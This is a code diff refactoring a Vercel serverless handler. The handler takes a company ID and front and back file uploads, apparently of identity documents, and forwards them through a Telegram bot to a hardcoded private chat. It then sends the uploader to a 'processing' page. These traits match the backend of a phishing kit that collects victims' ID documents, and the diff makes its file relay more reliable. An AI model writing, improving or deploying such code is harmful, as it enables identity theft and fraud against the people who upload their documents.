@@ -1,21 +1,23 @@
-// Use 'require' for internal Node modules for maximum Vercel compatibility
-const fs = require('fs');
-const FormData = require('form-data');
-const formidable = require('formidable');
-const axios = require('axios');
+import fs from 'fs';
+import FormData from 'form-data';
+import formidable from 'formidable';
+import axios from 'axios';
 
-// NOTE: Set your Telegram Bot Token as a Vercel Environment Variable 
+// NOTE: Ensure TELEGRAM_BOT_TOKEN is set in Vercel Environment Variables
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; 
-const CHAT_ID = '8483934112'; 
+const CHAT_ID = '8483934112'; // Your fixed chat ID
 
-// IMPORTANT: Vercel serverless functions exports format
+/**
+ * Vercel Serverless Function handler for form submissions.
+ */
 export default async function handler(req, res) {
     if (req.method !== 'POST') {
         return res.status(405).send('Method Not Allowed');
     }
     
+    // Crucial check for configuration
     if (!BOT_TOKEN) {
-        console.error("TELEGRAM_BOT_TOKEN environment variable is not set!");
+        console.error("Configuration Error: TELEGRAM_BOT_TOKEN is missing.");
         return res.status(500).send('Configuration Error: Missing Bot Token');
     }
 
@@ -24,34 +26,38 @@ export default async function handler(req, res) {
     let fields;
     let files;
     
+    // --- 1. Parse incoming form data (files and text) ---
     try {
-        [fields, files] = await new Promise((resolve, reject) => {
-            form.parse(req, (err, fields, files) => {
-                if (err) {
-                    reject(err);
-                } else {
-                    resolve([fields, files]);
-                }
-            });
-        });
+        // This is the intended usage for formidable v3+ with async/await
+        [fields, files] = await form.parse(req);
     } catch (err) {
-        console.error('Formidable Parse Error:', err);
+        console.error('Formidable Parse Crash:', err);
         return res.status(500).send('File Upload Processing Failed');
     }
 
-    // Adapt fields to simple string values
+    // Adapt fields from formidable's array structure
     const companyId = fields.companyId ? fields.companyId[0] : '';
     const frontFile = files.frontUpload ? files.frontUpload[0] : null;
     const backFile = files.backUpload ? files.backUpload[0] : null;
 
-    // --- Helper function to send files ---
+    // --- 2. Telegram Helpers ---
+    
+    async function sendMessage(chatId, text) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        try {
+            await axios.post(url, { chat_id: chatId, text: text });
+        } catch (error) {
+            console.error('Telegram Send Message Error:', error.response?.data || error.message);
+        }
+    }
+
     async function sendDocument(chatId, file) {
         if (!file || file.size === 0) return;
 
         const formData = new FormData();
         formData.append('chat_id', chatId);
         
-        // Ensure the file exists before creating a stream
+        // Ensure file exists and get the read stream
         if (!fs.existsSync(file.filepath)) {
              console.error(`File path does not exist: ${file.filepath}`);
              return;
@@ -59,6 +65,7 @@ export default async function handler(req, res) {
 
         const fileStream = fs.createReadStream(file.filepath);
         
+        // Append the file stream with correct metadata
         formData.append('document', fileStream, {
             filename: file.originalFilename,
             contentType: file.mimetype,
@@ -67,38 +74,32 @@ export default async function handler(req, res) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
         
         try {
-            await axios.post(url, formData, {
-                headers: formData.getHeaders(),
+            await axios.post(url, formData, { 
+                headers: formData.getHeaders(), 
+                timeout: 60000 // Increase timeout for large files
             });
+            
+            // Clean up the temporary file after successful transmission
+            fs.unlinkSync(file.filepath); 
+            
         } catch (error) {
             console.error('Telegram Send Document Error:', error.response?.data || error.message);
+            // Attempt to clean up even on error
+            try { fs.unlinkSync(file.filepath); } catch(e) {}
         }
+    }
+
+    // --- 3. Execution ---
+    if (companyId) { 
+        await sendMessage(CHAT_ID, `📌 New Submission\nCompany ID: ${companyId}`); 
     }
     
-    // --- Helper function to send messages ---
-    async function sendMessage(chatId, text) {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        try {
-            await axios.post(url, {
-                chat_id: chatId,
-                text: text,
-            });
-        } catch (error) {
-            console.error('Telegram Send Message Error:', error.response?.data || error.message);
-        }
-    }
-
-    // 4. Execution
-    if (companyId) {
-        await sendMessage(CHAT_ID, `📌 New Submission\nCompany ID: ${companyId}`);
-    }
-
     await sendDocument(CHAT_ID, frontFile);
     await sendDocument(CHAT_ID, backFile);
     
     await sendMessage(CHAT_ID, "✅ All files and data received successfully.");
 
-    // 5. Redirect the user
+    // --- 4. Redirect the user (Serverless response) ---
     res.setHeader('Location', '/processing.html');
     res.status(302).end();
 }
